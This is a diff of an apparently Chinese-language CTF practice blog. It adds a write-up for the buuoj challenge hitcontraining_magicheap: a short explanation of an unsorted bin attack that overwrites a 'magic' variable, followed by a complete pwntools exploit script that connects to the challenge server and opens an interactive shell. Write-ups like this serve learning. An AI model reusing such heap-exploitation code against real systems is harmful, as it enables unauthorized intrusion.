@@ -6,6 +6,8 @@ top: 3
 ---
 在buuoj平台上做题的记录，一般情况下只记录能学到新东西的题  
 同类型的题只记录一次  
+有一些觉得比较典型的题，单独写，在此处贴链接  
+主要看心情  
 <!-- more -->
 ## 0x01 rip覆盖一下  
 ```Python
@@ -599,5 +601,58 @@ exp()
 https://n0vice.top/2020/04/16/0ctf2017-babyheap  
 ## 0x18  wdb2018_guess  
 https://n0vice.top/2020/04/09/Stack-smash  
-## 0x19  
-咕咕咕……  
+## 0x19  hitcontraining_magicheap  
+满足choice为4869，并且magic的值大于4869，即可getshell  
+我们利用unsorted bin attack，将magic的值改掉即可    
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+from LibcSearcher import *
+import sys
+#context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './magicheap' 
+local = 0
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",25408)
+elf=ELF(binary)
+libc=elf.libc
+magic = 0x6020A0
+def add(size,content):
+    p.recvuntil("choice :")
+    p.sendline("1")
+    p.recvuntil("Heap : ")
+    p.sendline(str(size))
+    p.recvuntil("heap:")
+    p.send(content)
+def edit(index,size,content):
+    p.recvuntil("choice :")
+    p.sendline("2")
+    p.recvuntil("Index :")
+    p.sendline(str(index))
+    p.recvuntil("Heap : ")
+    p.sendline(str(size))
+    p.recvuntil("heap : ")
+    p.send(content)
+def free(index):
+    p.recvuntil("choice :")
+    p.sendline("3")
+    p.recvuntil("Index :")
+    p.sendline(str(index))
+def exp():
+    add(0x90,"aaa") # 0
+    add(0x90,"bbb") # 1
+    add(0x10,"ccc")
+    free(1)
+    payload = "a"*0x90 + p64(0) + p64(0xa1) + p64(0) + p64(magic-16)
+    edit(0,0xb0,payload)
+    add(0x90,"fuck")
+    p.recvuntil(":")
+    p.sendline("4869")
+    p.interactive()
+exp()
+```  
+## 0x20 roarctf_2019_easy_pwn  
